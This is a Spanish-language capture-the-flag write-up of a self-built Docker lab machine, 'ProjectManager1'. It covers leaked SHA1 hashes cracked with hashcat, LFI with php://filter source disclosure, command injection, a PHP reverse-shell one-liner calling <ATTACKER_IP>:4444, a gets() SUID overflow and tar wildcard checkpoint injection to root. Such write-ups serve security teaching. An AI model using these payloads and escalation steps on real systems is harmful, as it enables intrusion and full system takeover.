---
title: "ProjectManager1"
date: 2026-08-11
categories: [Custom, Easy]
tags: [linux, apache, php, information disclosure, sensitive data exposure, sha1, hashcat, credential reuse, LFI, php filter, command injection, RCE, reverse shell, SUID, buffer overflow, gets, sudo, tar wildcard, gtfobins, docker]
image:
  path: /assets/img/Custom/ProjectManager1/banner.jpeg
  alt: ProjectManager1 writeup
---

Un `users.json` legible por cualquiera filtró hashes SHA1 que cayeron contra `rockyou.txt`, dándome una sesión web; un fallo de directory traversal / LFI en `dashboard.php?dir=` expuso después un segundo fichero de credenciales y me permitió leer el código de `admin.php` a través de un wrapper `php://filter`, revelando un sink `exec()` alimentado con entrada sin sanitizar. Esa inyección de comandos me dio una reverse shell como `www-data`, la reutilización de credenciales me llevó a `melendez`, un desbordamiento de buffer con `gets()` en un binario SUID escaló a `monre`, y un script de backup ejecutable con `sudo` que envolvía `tar` con un wildcard cerró la cadena hasta `root` mediante inyección de checkpoint-action.

| Campo      | Detalles           |
|------------|--------------------|
| Plataforma | Custom (self-made) |
| Dificultad | Easy               |
| SO         | Linux              |
| IP         | 172.30.0.2         |
| Fecha      | Agosto 2026        |

## Herramientas Utilizadas

| Herramienta | Descripción                                                              |
|-------------|--------------------------------------------------------------------------|
| arp-scan    | Descubrimiento de hosts a nivel de capa 2 en el bridge de Docker local   |
| nmap        | Escaneo de puertos TCP y fingerprinting de servicios/versiones           |
| gobuster    | Fuerza bruta de directorios y ficheros sobre HTTP                        |
| curl        | Descarga de los ficheros JSON expuestos e interacción con la app por CLI |
| hashcat     | Cracking offline de los hashes SHA1 filtrados                            |
| netcat      | Listener para recibir el callback de la reverse shell                    |

## Despliegue

Es una máquina Docker hecha por mí y de acceso público; el objetivo es un contenedor publicado en una red bridge interna. Se clona y arranca desde GitHub, algo que conviene tener en cuenta porque el hostname del contenedor que aparece en los prompts de más abajo es un ID de Docker efímero (redesplegué el contenedor un par de veces durante las pruebas, así que los prompts se han normalizado a un único identificador por legibilidad):

```bash
git clone https://github.com/andermonreal/ProjectManager.git
cd ProjectManager/
chmod +x start.sh
./start.sh
[+] Building 17.0s (10/10) FINISHED
9c46fb0ee2a0e9044a22d131c97a33a361aae4c2e5069175e37b40858d79f107
```

## Reconocimiento y Enumeración

El objetivo de esta fase fue enumerar los servicios expuestos e identificar el stack de la aplicación que merecía la pena atacar.

### Descubrimiento del Host

Como la máquina vive en un bridge interno de Docker y no en una subred VPN enrutada, el descubrimiento de hosts empieza en capa 2. Primero identifiqué la interfaz del bridge y su red, y luego la barrí con `arp-scan`:

```bash
ip a
27: br-8af8885567c4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether c2:b5:ff:af:d8:13 brd ff:ff:ff:ff:ff:ff
    inet <ATTACKER_IP>/24 brd 172.30.0.255 scope global br-8af8885567c4

sudo arp-scan -I br-8af8885567c4 --localnet
Interface: br-8af8885567c4, type: EN10MB, MAC: c2:b5:ff:af:d8:13, IPv4: <ATTACKER_IP>
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.30.0.2	9a:eb:39:fe:f2:4b	(Unknown: locally administered)
1 packets received by filter, 0 packets dropped by kernel
```

El único otro host del segmento es `172.30.0.2` — el contenedor objetivo. Un solo echo ICMP confirma el alcance y da una pista sobre el sistema operativo mediante el TTL:

```bash
ping -c 1 172.30.0.2
PING 172.30.0.2 (172.30.0.2) 56(84) bytes of data.
64 bytes from 172.30.0.2: icmp_seq=1 ttl=64 time=0.043 ms
```

Un TTL de 64 indica un host Linux (por defecto 64; en el mismo bridge no hay salto de enrutamiento que lo decremente). La latencia por debajo del milisegundo es la esperada para un contenedor local.

### Escaneo de Puertos

Un barrido TCP completo a alta tasa de paquetes, volcado a un fichero grepable, establece toda la superficie de ataque antes de sondear en profundidad:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 172.30.0.2 -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 9A:EB:39:FE:F2:4B (Unknown)
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```

Aquí `-Pn` omite el descubrimiento de hosts (el ICMP ya probó que estaba viva), `-n` desactiva la resolución DNS inversa para ganar velocidad, `-sS` es un escaneo SYN/stealth, y `--min-rate 5000` es el compromiso de velocidad. Solo hay un puerto abierto. Un escaneo dirigido con detección de servicios y scripts por defecto lo identifica:

```bash
sudo nmap -p80 -sCV 172.30.0.2 -oN nmap
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.66 (Ubuntu)
|_http-title: Project Manager - Welcome
```

El stack es Apache sobre Ubuntu sirviendo una aplicación PHP ("Project Manager"). La cookie `PHPSESSID` sin el flag `httponly` es un problema menor de higiene, pero todo el compromiso vive en el puerto 80, así que la aplicación web es la superficie de ataque completa.

### Enumeración de la Aplicación Web

La página de inicio es un frontal de marketing del SaaS "ProjectManager", con un login que lo protege por detrás.

![Página de inicio de ProjectManager1 servida en el puerto 80](/assets/img/Custom/ProjectManager1/cap1.png)

Con el framework identificado como PHP puro, el descubrimiento de contenido apunta a las extensiones `.php` y `.json` además de a directorios:

```bash
gobuster dir -u http://172.30.0.2 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x php,json
about_us.php         (Status: 200) [Size: 2864]
admin.php            (Status: 302) [Size: 0] [--> login.php]
css                  (Status: 301) [Size: 346] [--> http://172.30.0.2/css/]
dashboard.php        (Status: 302) [Size: 0] [--> login.php]
index.php            (Status: 200) [Size: 2034]
js                   (Status: 301) [Size: 345] [--> http://172.30.0.2/js/]
login.php            (Status: 200) [Size: 1260]
logout.php           (Status: 302) [Size: 0] [--> login.php]
projects             (Status: 301) [Size: 351] [--> http://172.30.0.2/projects/]
users.json           (Status: 200) [Size: 6512]
```

`admin.php` y `dashboard.php` redirigen a los usuarios no autenticados a `login.php`, lo cual es esperable — protegen contenido tras una sesión. El hallazgo que importa es `users.json` devolviendo `200`: un fichero de datos de la aplicación servido directamente por Apache sin ninguna autenticación por delante.

## Explotación

### Exposición de Datos Sensibles — `users.json`

Servir la base de datos de usuarios como un fichero JSON estático junto a la aplicación es un error clásico de divulgación de información. Descargarlo vuelca todas las cuentas, hashes de contraseña incluidos:

```bash
curl -s http://172.30.0.2/users.json
[
  {
    "username": "jdoe",
    "email": "jdoe@example.com",
    "phone": "555-123-4567",
    "address": "123 Elm Street, Springfield",
    "password": "736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b",
    "projects": [ ... ]
  },
  {
    "username": "asmith",
    "password": "b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839",
    ...
  },
  ... (8 usuarios en total)
]
```

Las contraseñas son cadenas de 40 caracteres hexadecimales — digests SHA1 sin sal. En lugar de tratar el fichero a mano, un pequeño pipeline extrae solo los valores de los hashes a un fichero listo para el diccionario:

```bash
curl -s http://172.30.0.2/users.json | grep "password" | awk '{printf $NF}' | sed 's/",/\n/g' | sed 's/"//g' > hashes.txt
736fd5e59bc62eb1fbb144b8c8706a0a13e65e9b
b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839
9ad8c653d2514a5c0d97fa6ab6c4c5b2269b7e0b
a1fc51f35b606c97f3136184ea1285045a14d3a7
ab0edb614669891df5d103ca6e96df53d850098b
6d03ea92dc1216c5d254b768239a73adbf03b0de
8c4e1f1567335f2849f3dbbdbb3c4ae614e780b7
1d3a5fcb248d6f4b4cc1964e881c98e5d2585025
```

`grep` extrae las líneas de password, `awk '{printf $NF}'` se queda solo con el último campo (el hash entre comillas), y los dos pases de `sed` eliminan la puntuación JSON. Pasar estos SHA1 sin sal contra `rockyou.txt` con el hash-mode `100` crackea dos de ellos casi al instante:

```bash
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
ab0edb614669891df5d103ca6e96df53d850098b:brownie
b55be3ebd5ed9d8e71ea7b341ed9f436aeb65839:greenapple
Recovered........: 2/8 (25.00%) Digests (total)
```

Correlacionando los hashes crackeados de vuelta con el JSON obtenemos dos cuentas válidas de la aplicación:

```text
dlbrown:brownie
asmith:greenapple
```

`asmith:greenapple` autentica sin problemas contra el formulario de login, entrando al dashboard del workspace.

![Iniciando sesión en el dashboard como asmith](/assets/img/Custom/ProjectManager1/cap2.png)

![El dashboard de asmith tras la autenticación](/assets/img/Custom/ProjectManager1/cap3.png)

### Local File Inclusion — `dashboard.php?dir=`

El dashboard tiene un navegador de "Project Files". Inspeccionando su código fuente se ve que el panel de ficheros se controla con un parámetro `dir` (`dashboard.php?dir=projects/asmith#files`) — un parámetro con forma de nombre de fichero que se pasa directamente a una lectura de fichero/directorio es la firma de manual de un fallo de path traversal / LFI. Apuntándolo al directorio de trabajo actual en lugar de a una carpeta de proyecto lo confirma:

```text
http://172.30.0.2/dashboard.php?dir=./
```

En vez de un listado de proyectos de `asmith`, el panel enumera la raíz de la aplicación, exponiendo ficheros que el descubrimiento de contenido nunca enlazó — sobre todo un volcado de credenciales de administrador con un nombre extraño:

![Listado de directorio vía LFI exponiendo adminsCreds43Fb3r8723FDSbncv43.json](/assets/img/Custom/ProjectManager1/cap4.png)

El nombre `adminsCreds43Fb3r8723FDSbncv43.json` es seguridad por oscuridad: imposible de adivinar por fuerza bruta, pero trivialmente expuesto en cuanto el listado de directorios es posible. Descargarlo da dos hashes SHA1 más, esta vez de cuentas de administrador:

```bash
curl -s http://172.30.0.2/adminsCreds43Fb3r8723FDSbncv43.json
[
    {
        "username": "melendez",
        "password": "53ec18a0217472b20f662b347c74ceeda67dd1b8",
        ...
    },
    {
        "username": "monre",
        "password": "5d965f573297385c5f61d88be4d97c32e021c989",
        ...
    }
]
```

Mismo enfoque de extracción y cracking que antes. Solo el hash de `melendez` cae contra `rockyou.txt`; el de `monre` nunca crackea (y no hace falta — a `monre` se llega más tarde a través de un binario SUID, no de una contraseña):

```bash
curl -s http://172.30.0.2/adminsCreds43Fb3r8723FDSbncv43.json | grep "password" | awk '{printf $NF}' | sed 's/",/\n/g' | sed 's/"//g' > moreHashes.txt

hashcat -m 100 moreHashes.txt /usr/share/wordlists/rockyou.txt
53ec18a0217472b20f662b347c74ceeda67dd1b8:melendez123
Recovered........: 1/1 (100.00%) Digests (total)
```

`melendez:melendez123` inicia sesión con privilegios de administrador, desbloqueando el Admin Panel que `asmith` no podía alcanzar.

![Admin Panel alcanzado como melendez](/assets/img/Custom/ProjectManager1/cap5.png)

#### Leyendo código fuente con un wrapper `php://filter`

El LFI hace más que listar directorios — incluye ficheros. Solicitar `admin.php` directamente a través de él simplemente ejecutaría el PHP en el servidor y devolvería solo su HTML renderizado, ocultando la lógica. El wrapper `php://filter` resuelve esto: encadenar `convert.base64-encode` hace que PHP lea el objetivo como un stream y lo codifique en Base64 *antes* de que el motor de include pueda ejecutarlo, así que el código fuente vuelve como texto.

```text
http://172.30.0.2/dashboard.php?dir=php://filter/convert.base64-encode/resource=admin.php
```

![Código de admin.php divulgado en Base64 a través del wrapper php filter](/assets/img/Custom/ProjectManager1/cap6.png)

Decodificar el blob Base64 revela el manejador de "Add New User". La parte interesante es cómo registra las cuentas nuevas:

```php
$username = $_POST['username'];
$email    = $_POST['email'];
$phone    = $_POST['phone'];
$address  = $_POST['address'];
$password = sha1($_POST['password']);
// ...
$logMessage = "New user added: $username, email: $email, phone: $phone, address: $address";
exec("echo $logMessage >> ./user_creation.log");
```

### Inyección de Comandos → RCE

El bug es la llamada a `exec()`. `$logMessage` interpola campos `$_POST` en crudo — `$address` entre ellos — directamente en una cadena que se entrega a una shell. La única sanitización de todo el manejador es `htmlspecialchars()`, y se aplica exclusivamente al mensaje de éxito que se devuelve al navegador, no al valor que llega a `exec()`. Cualquier cosa que ponga en `Address` se ejecuta como comando de shell en el contexto del usuario del servidor web.

Lo verifiqué primero con una prueba inofensiva: creando un usuario con el campo `Address` puesto a `test; id`. El `;` termina el `echo` y arranca un segundo comando.

![Inyección de comandos a través del campo Address en el formulario Add New User](/assets/img/Custom/ProjectManager1/cap7.png)

Como la salida inyectada se añade a `user_creation.log`, y ese log es a su vez legible a través del LFI, puedo confirmar la ejecución leyendo el log de vuelta:

![user_creation.log filtrando la salida de id, confirmando ejecución de código como www-data](/assets/img/Custom/ProjectManager1/cap8.png)

```text
http://172.30.0.2/dashboard.php?dir=.%2F%2Fuser_creation.log#files

New user added: johndoe, email: johndoe@example.com, phone: 1234567890, address: 123 Elm Street, Springfield
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La línea `uid=33(www-data)` es la confirmación: se ejecutan comandos arbitrarios como `www-data`. Pasar de una escritura a ciegas a una sesión interactiva solo consiste en cambiar la prueba por una reverse shell. Lancé un listener y puse el campo `Address` a un callback PHP de una línea:

```text
Address: test; php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.30.0.2 53968
/bin/sh: 0: can't access tty; job control turned off
$
```

El listener recibió el callback como `www-data`. Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

## Movimiento Lateral — `www-data` → `melendez`

`www-data` es una cuenta de servicio sin flag. Enumerar qué humanos tienen realmente shells de login reduce los objetivos de movimiento lateral:

```bash
www-data@b82581628977:/var/www/html$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
melendez:x:1001:1001::/home/melendez:/bin/bash
monre:x:1002:1002::/home/monre:/bin/bash
```

`melendez` existe como usuario del sistema, y ya crackeé la contraseña de aplicación `melendez123` para ese mismo nombre. La reutilización de contraseñas entre la capa de aplicación y la capa del sistema operativo es una de las primitivas de movimiento lateral más habituales, así que probarla contra `su` es la jugada evidente:

```bash
www-data@b82581628977:/var/www/html$ su melendez
Password:
melendez@b82581628977:/var/www/html$ cd
melendez@b82581628977:~$ ls
adminAuth  user.txt
melendez@b82581628977:~$ cat user.txt
```

El administrador de la aplicación y el usuario del sistema comparten `melendez123`. Este es el foothold propiamente dicho — `melendez` posee `user.txt`.

## Escalada de Privilegios

### `melendez` → `monre` — Desbordamiento de Buffer en el binario SUID `adminAuth`

Junto a `user.txt` hay un binario a medida, `adminAuth`. Sus permisos lo cuentan todo:

```bash
melendez@b82581628977:~$ ls -la adminAuth
-rwsr-xr-x 1 monre monre 16432 Aug 11 15:24 adminAuth
```

La `s` en `-rwsr-xr-x` es el bit SUID, y el propietario es `monre`. Cualquier código que el binario ejecute corre con el UID efectivo de `monre`, sin importar quién lo lance. Ejecutarlo presenta un prompt de "access code" que rechaza la entrada normal:

```bash
melendez@b82581628977:~$ ./adminAuth
=== Project Manager :: Admin Access Verification ===
Enter your access code: 1
[-] Access denied.
melendez@b82581628977:~$ ./adminAuth
=== Project Manager :: Admin Access Verification ===
Enter your access code: -123
[-] Access denied.
```

Ninguna entrada numérica pasa la comprobación. La vulnerabilidad está en *cómo* se lee el código. El binario usa `gets()` para leer el código de acceso en un buffer de pila de tamaño fijo, y `gets()` no realiza ninguna comprobación de límites — sigue escribiendo más allá del final del buffer hasta que encuentra un salto de línea. Una entrada suficientemente larga desborda el buffer y sobrescribe la memoria de pila adyacente que gobierna la decisión de autorización, desviando el programa a su rama de "acceso concedido", que lanza una shell. Como el binario es SUID `monre`, esa shell es una shell de `monre`:

```bash
melendez@b82581628977:~$ ./adminAuth
=== Project Manager :: Admin Access Verification ===
Enter your access code: 11111111111111111111111111111111111

[+] Access code accepted. Launching admin shell...
monre@b82581628977:~$
```

Aquí no hizo falta desarrollo de exploits — una cadena lo bastante larga basta para corromper la comprobación. En un objetivo endurecido inspeccionarías el binario con `checksec` y elaborarías un desbordamiento preciso en `gdb`, pero esta máquina buscaba la lección de `gets()`, no una cadena ROP.

### `monre` → `root` — Inyección de wildcard de `tar` vía `sudo` `backup.sh`

Lo primero que compruebo como `monre` es qué puede ejecutar como `root`:

```bash
monre@b82581628977:~$ sudo -l
User monre may run the following commands on b82581628977:
    (root) NOPASSWD: /opt/pm/backup.sh

monre@b82581628977:~$ ls /opt/pm -la
total 12
drwxr-xr-x 1 root root 4096 Aug 11 17:00 .
drwxr-xr-x 1 root root 4096 Aug 11 17:00 ..
-rwxr-xr-x 1 root root  478 Aug 11 16:59 backup.sh
```

`monre` puede ejecutar `/opt/pm/backup.sh` como `root` sin contraseña. El script pertenece a root y `monre` no puede escribir en él, así que el cuerpo del script no se puede editar — la escalada tiene que venir de cómo opera. `backup.sh` archiva `/var/www/uploads` con `tar` usando un wildcard (`tar czf ... *`), y ese wildcard es el fallo.

Cuando una shell expande `*`, convierte cada nombre de fichero del directorio en un argumento separado. `tar` entonces parsea esos argumentos, y trata cualquier cosa que parezca una opción como una opción — aunque su origen fuera un nombre de fichero. Dejando ficheros cuyos *nombres* son flags de línea de comandos de `tar`, puedo colar opciones en un comando que no controlo. El par `--checkpoint` / `--checkpoint-action` de GTFOBins es el vector canónico: `--checkpoint=1` le dice a `tar` que dispare una acción tras el primer registro, y `--checkpoint-action=exec=...` define esa acción como un comando arbitrario.

Preparé un pequeño script de payload y los dos ficheros con nombre de opción en el directorio que `tar` va a archivar:

```bash
monre@b82581628977:/opt/pm$ cd /var/www/uploads/
monre@b82581628977:/var/www/uploads$ echo "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash" > x.sh
monre@b82581628977:/var/www/uploads$ echo > "--checkpoint=1"
monre@b82581628977:/var/www/uploads$ echo > "--checkpoint-action=exec=bash x.sh"
```

`x.sh` copia `bash` a `/tmp/rootbash` y le pone el SUID. Cuando `backup.sh` ejecuta `tar` sobre el directorio, el wildcard expande `--checkpoint=1` y `--checkpoint-action=exec=bash x.sh` a opciones reales de `tar`, y `tar` — ejecutándose como `root` — ejecuta `x.sh`:

```bash
monre@b82581628977:/var/www/uploads$ sudo /opt/pm/backup.sh
[*] Backing up /var/www/uploads ...
[+] Backup written to /var/backups/uploads-2026-08-11.tgz

monre@b82581628977:/var/www/uploads$ ls -la /tmp/
-rwsr-xr-x 1 root root 1540520 Aug 11 17:10 rootbash
```

`/tmp/rootbash` es ahora una copia SUID de `bash` propiedad de root. Invocarlo con `-p` preserva el UID efectivo en lugar de soltar privilegios, dejando una shell de root:

```bash
monre@b82581628977:/var/www/uploads$ cd /tmp/
monre@b82581628977:/tmp$ ./rootbash -p
rootbash-5.3# whoami
root
rootbash-5.3# cat /root/root.txt
```

Compromiso total conseguido.

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Puntos Clave

- **Los ficheros de datos de la aplicación servidos junto a ella son un bypass de autenticación con otro nombre.** `users.json` y `adminsCreds43Fb3r8723FDSbncv43.json` nunca debieron poder descargarse directamente, pero Apache los sirvió tan contento como contenido estático. Un nombre de fichero imposible de adivinar no es control de acceso — en cuanto el listado de directorios o un LFI son posibles, la oscuridad no compra nada.

- **SHA1 sin sal no es almacenamiento de contraseñas, es una clave de búsqueda.** Los hashes rápidos y sin sal caen ante un diccionario en segundos. La distancia entre "hasheamos nuestras contraseñas" y "nuestras contraseñas están crackeadas" es una sola invocación de `hashcat`; solo un KDF lento y con sal (bcrypt, argon2) cambia esa aritmética.

- **`php://filter/convert.base64-encode` convierte un LFI basado en include en divulgación de código fuente.** Cuando una inclusión de fichero ejecuta el PHP en vez de mostrarlo, el wrapper Base64 lee el fichero como un stream y lo codifica antes de la ejecución, entregándote el código fuente en crudo. Y la divulgación de código fuente te entrega gratis todos los bugs del lado servidor.

- **Nunca construyas una cadena de comando de shell a partir de la entrada del usuario.** El sink `exec("echo $logMessage ...")` concatenó campos POST en crudo dentro de una línea de comandos; `htmlspecialchars()` sobre la cadena *de visualización* no hizo nada por la cadena *de shell*. La codificación de salida y la sanitización de comandos son problemas distintos — usa `escapeshellarg()`, o mejor, no invoques una shell en absoluto.

- **La reutilización de credenciales entre la frontera app/SO debe comprobarse por reflejo.** El mismo `melendez123` desbloqueó a la vez una cuenta de administrador de la aplicación y un login del sistema. Tras crackear cualquier hash de aplicación, probarlo contra los usuarios de `/etc/passwd` vía `su`/`ssh` debería ser automático, no un pensamiento tardío.

- **`gets()` no tiene ningún uso seguro.** Un binario SUID que lee entrada con `gets()` es explotable por definición; la comprobación de límites ausente permite que una cadena larga corrompa lo que sea que el programa use a continuación. El arreglo es `fgets()` con un límite de longitud — no hay configuración que haga aceptable a `gets()`.

- **Un wildcard en un comando privilegiado `tar`/`chown`/`rsync` es una shell de root en potencia.** Los nombres de fichero se convierten en argumentos, y los argumentos que parecen opciones *son* opciones. Cualquier script ejecutable con `sudo` que expanda `*` dentro de `tar` es vulnerable a la inyección de `--checkpoint-action` — fija rutas exactas y pasa `--` antes de los argumentos de fichero.
